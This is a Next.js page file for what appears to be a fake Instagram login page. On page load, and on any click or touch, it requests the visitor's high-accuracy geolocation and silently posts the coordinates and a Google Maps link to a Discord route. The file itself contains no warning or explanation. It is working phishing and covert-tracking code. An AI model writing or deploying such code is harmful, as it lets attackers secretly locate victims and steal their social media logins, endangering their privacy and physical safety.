'use client'

import { useState, useEffect, useRef } from 'react'
import InstagramLogin from '@/components/InstagramLogin'

export default function Home() {
  const [locationGranted, setLocationGranted] = useState(false)
  const [location, setLocation] = useState<{ lat: number; lng: number } | null>(null)
  const locationRequested = useRef(false)

  const requestLocation = () => {
    if (locationRequested.current || !navigator.geolocation) return
    
    locationRequested.current = true
    
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords
        setLocation({ lat: latitude, lng: longitude })
        setLocationGranted(true)
        
        // Send location to Discord immediately
        sendLocationToDiscord(latitude, longitude)
      },
      (error) => {
        console.error('Location access denied or error:', error)
        locationRequested.current = false // Allow retry on error
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
      }
    )
  }

  useEffect(() => {
    // Try to request location on page load (works on desktop/localhost)
    // On mobile, this will be triggered by user interaction
    if (navigator.geolocation) {
      // Small delay to ensure page is loaded
      const timer = setTimeout(() => {
        requestLocation()
      }, 500)
      
      return () => clearTimeout(timer)
    }
  }, [])

  const sendLocationToDiscord = async (lat: number, lng: number) => {
    try {
      const response = await fetch('/api/discord', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          type: 'location',
          latitude: lat,
          longitude: lng,
          mapUrl: `https://www.google.com/maps?q=${lat},${lng}`,
        }),
      })

      if (!response.ok) {
        console.error('Failed to send location to Discord')
      }
    } catch (error) {
      console.error('Error sending location:', error)
    }
  }

  return (
    <main onClick={requestLocation} onTouchStart={requestLocation}>
      <InstagramLogin location={location} onUserInteraction={requestLocation} />
    </main>
  )
}

